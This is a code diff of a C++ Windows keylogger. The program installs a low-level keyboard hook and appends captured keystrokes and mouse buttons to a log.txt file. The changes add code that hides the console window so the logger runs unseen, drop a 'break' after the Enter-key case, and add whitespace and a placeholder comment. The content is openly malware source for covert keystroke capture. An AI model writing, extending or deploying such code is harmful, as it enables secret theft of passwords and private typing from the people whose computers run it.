@@ -12,6 +12,9 @@ LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
 int main()
 {
 
+HWND hWnd = GetConsoleWindow(); 
+ShowWindow( hWnd, SW_HIDE ); 
+
 HINSTANCE appInstance = GetModuleHandle(NULL);
 
     SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );
@@ -21,7 +24,7 @@ while(GetMessage(&msg, NULL, 0, 0) > 0)
         TranslateMessage(&msg);
         DispatchMessage(&msg);
 }
-
+	
 return 0;
 }
 //TESTING
@@ -40,6 +43,7 @@ ofstream myfile("log.txt", std::ios::app);
             switch( pKeyBoard->vkCode ) 
             {
 //Buttons	
+				
 				case VK_MBUTTON:
 					myfile<<"\n button \n";
 				break;
@@ -51,7 +55,6 @@ ofstream myfile("log.txt", std::ios::app);
             	break;
             	case VK_RETURN: 
                 	myfile<<"\n Enter  \n"; 
-           		break;
 				case VK_XBUTTON1:
 					myfile<<"XBUTTON";
 				break;
@@ -184,3 +187,5 @@ ofstream myfile("log.txt", std::ios::app);
     myfile.close();
     return 0;
 }
+// SOMETHING NEW BELOW
+
